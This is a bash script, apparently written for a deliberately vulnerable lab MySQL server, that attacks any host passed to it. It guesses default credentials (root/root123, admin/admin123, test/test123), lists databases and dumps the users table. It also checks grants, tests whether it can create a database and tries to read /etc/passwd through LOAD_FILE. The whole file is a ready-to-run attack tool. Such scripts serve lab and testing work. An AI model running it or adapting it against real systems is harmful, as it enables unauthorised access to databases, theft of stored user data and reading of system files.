#!/bin/bash

# Script to exploit the vulnerable database

set -e

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

if [ -z "$1" ]; then
    echo -e "${RED}Usage: $0 <HOST> [PORT]${NC}"
    echo "Example: $0 localhost 3306"
    exit 1
fi

DB_HOST="$1"
DB_PORT="${2:-3306}"

echo -e "${BLUE}=== Exploiting Vulnerable Database ===${NC}\n"

# Check if mysql client is installed
if ! command -v mysql &> /dev/null; then
    echo -e "${YELLOW}mysql client is not installed. Installing...${NC}"
    sudo apt-get update -y && sudo apt-get install -y mysql-client || {
        echo -e "${RED}Could not install mysql client${NC}"
        exit 1
    }
fi

# 1. Try connection with default credentials
echo -e "${YELLOW}[1] Attempting connection with default credentials...${NC}"

# root/root123
echo -e "${YELLOW}   Trying root/root123...${NC}"
mysql -h "$DB_HOST" -P "$DB_PORT" -u root -proot123 -e "SELECT 'Connection successful' AS status;" 2>/dev/null && {
    echo -e "${GREEN}✓ Connection successful with root/root123${NC}"
    DB_USER="root"
    DB_PASS="root123"
} || {
    # admin/admin123
    echo -e "${YELLOW}   Trying admin/admin123...${NC}"
    mysql -h "$DB_HOST" -P "$DB_PORT" -u admin -padmin123 -e "SELECT 'Connection successful' AS status;" 2>/dev/null && {
        echo -e "${GREEN}✓ Connection successful with admin/admin123${NC}"
        DB_USER="admin"
        DB_PASS="admin123"
    } || {
        # test/test123
        echo -e "${YELLOW}   Trying test/test123...${NC}"
        mysql -h "$DB_HOST" -P "$DB_PORT" -u test -ptest123 -e "SELECT 'Connection successful' AS status;" 2>/dev/null && {
            echo -e "${GREEN}✓ Connection successful with test/test123${NC}"
            DB_USER="test"
            DB_PASS="test123"
        } || {
            echo -e "${RED}✗ Could not connect with default credentials${NC}"
            exit 1
        }
    }
}

# 2. List databases
echo -e "\n${YELLOW}[2] Listing databases...${NC}"
mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -e "SHOW DATABASES;" 2>/dev/null
echo -e "${GREEN}✓ Databases listed${NC}"

# 3. Access vulnerable database
echo -e "\n${YELLOW}[3] Accessing vulnerable_db...${NC}"
mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" vulnerable_db -e "SHOW TABLES;" 2>/dev/null
echo -e "${GREEN}✓ Access to vulnerable_db successful${NC}"

# 4. Read data from users table
echo -e "\n${YELLOW}[4] Reading data from users table...${NC}"
mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" vulnerable_db -e "SELECT * FROM users;" 2>/dev/null
echo -e "${GREEN}✓ Users data read${NC}"

# 5. Check user permissions
echo -e "\n${YELLOW}[5] Verifying user permissions...${NC}"
mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -e "SHOW GRANTS;" 2>/dev/null
echo -e "${GREEN}✓ Permissions verified${NC}"

# 6. Try to create a new database (if has permissions)
echo -e "\n${YELLOW}[6] Testing database creation...${NC}"
mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -e "CREATE DATABASE IF NOT EXISTS test_exploit;" 2>/dev/null && {
    echo -e "${GREEN}✓ Database created (elevated permissions)${NC}"
    mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -e "DROP DATABASE test_exploit;" 2>/dev/null
} || {
    echo -e "${YELLOW}   Could not create database (limited permissions)${NC}"
}

# 7. Try system file reading
echo -e "\n${YELLOW}[7] Testing system file reading...${NC}"
mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -e "SELECT LOAD_FILE('/etc/passwd');" 2>/dev/null | head -5 && {
    echo -e "${GREEN}⚠ Can read system files${NC}"
} || {
    echo -e "${YELLOW}   Cannot read system files${NC}"
}

# 8. Check MySQL version
echo -e "\n${YELLOW}[8] Verifying MySQL version...${NC}"
mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -e "SELECT VERSION();" 2>/dev/null
echo -e "${GREEN}✓ Version verified${NC}"

echo -e "\n${BLUE}=== Database Exploitation Completed ===${NC}"
